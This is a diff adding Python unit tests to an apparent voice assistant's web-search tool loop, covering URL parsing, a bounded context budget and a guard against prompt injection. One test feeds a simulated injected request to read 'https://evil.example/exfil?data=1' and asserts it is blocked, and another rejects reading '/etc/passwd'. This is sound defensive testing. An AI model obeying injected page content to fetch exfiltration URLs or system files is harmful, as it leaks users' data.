@@ -32,6 +32,13 @@ class ParseToolCallTests(unittest.TestCase):
         self.assertEqual(websearch.parse_tool_call("READ: https://example.com/a?b=1"),
                          ("read", "https://example.com/a?b=1"))
 
+    def test_read_marker_keeps_legal_url_punctuation(self):
+        # trailing '!' is a legal path char; only ONE sentence-final period goes
+        self.assertEqual(websearch.parse_tool_call("READ: https://x.wiki/Slate!"),
+                         ("read", "https://x.wiki/Slate!"))
+        self.assertEqual(websearch.parse_tool_call("READ: https://x.wiki/Slate!."),
+                         ("read", "https://x.wiki/Slate!"))
+
     def test_read_requires_http_url(self):
         self.assertIsNone(websearch.parse_tool_call("READ: /etc/passwd"))
         self.assertIsNone(websearch.parse_tool_call("read: ftp://x"))
@@ -187,6 +194,51 @@ class ToolLoopTests(unittest.TestCase):
         self.assertEqual(spark.memory.add.call_count, 2)
         self.assertEqual(spark.memory.add.call_args_list[1][0],
                          ("assistant", "SEARCH: anything."))
+
+    def test_read_after_search_only_allows_result_urls(self):
+        # prompt-injected pages must not steer her at other addresses
+        spark = self._spark()
+        spark.memory.messages.side_effect = lambda system: [{"role": "user", "content": "q"}]
+        spark.brain.chat_stream.side_effect = [
+            iter(["SEARCH: mars weather."]),
+            iter(["READ: https://evil.example/exfil?data=1"]),
+            iter(["Answering from the snippets instead."]),
+        ]
+        with patch.object(websearch, "web_search", return_value=[
+                {"title": "Mars", "snippet": "s", "url": "https://nasa.gov/mars"}]), \
+             patch.object(websearch, "read_page") as rp:
+            spark._llm_reply("what is the weather on mars?")
+            rp.assert_not_called()  # the off-list URL is never fetched
+        content = spark.brain.chat_stream.call_args_list[2][0][0][-1]["content"]
+        self.assertIn("not among the earlier results", content)
+        self.assertEqual(spark.memory.add.call_args_list[-1][0],
+                         ("assistant", "Answering from the snippets instead."))
+
+    def test_first_hop_read_of_user_url_stays_allowed(self):
+        # Matt reading an article aloud: no search happened, public URL OK
+        spark = self._spark()
+        spark.memory.messages.side_effect = lambda system: [{"role": "user", "content": "q"}]
+        spark.brain.chat_stream.side_effect = [
+            iter(["READ: https://example.com/article."]),
+            iter(["Great article."]),
+        ]
+        with patch.object(websearch, "read_page",
+                          return_value={"title": "T", "text": "body"}) as rp:
+            spark._llm_reply("read this to me: example.com/article")
+            rp.assert_called_once()
+
+    def test_cumulative_web_context_is_bounded(self):
+        spark = self._spark()
+        spark.memory.messages.side_effect = lambda system: [{"role": "user", "content": "q"}]
+        spark.brain.chat_stream.side_effect = [
+            iter(["READ: https://example.com/big."]),
+            iter(["Summarized."]),
+        ]
+        huge = {"title": "Big", "text": "x" * 12000}
+        with patch.object(websearch, "read_page", return_value=huge):
+            spark._llm_reply("read example.com/big")
+        content = spark.brain.chat_stream.call_args_list[1][0][0][-1]["content"]
+        self.assertLessEqual(len(content), 9000 + 800)  # budget + prompt scaffolding
 
 
 if __name__ == "__main__":
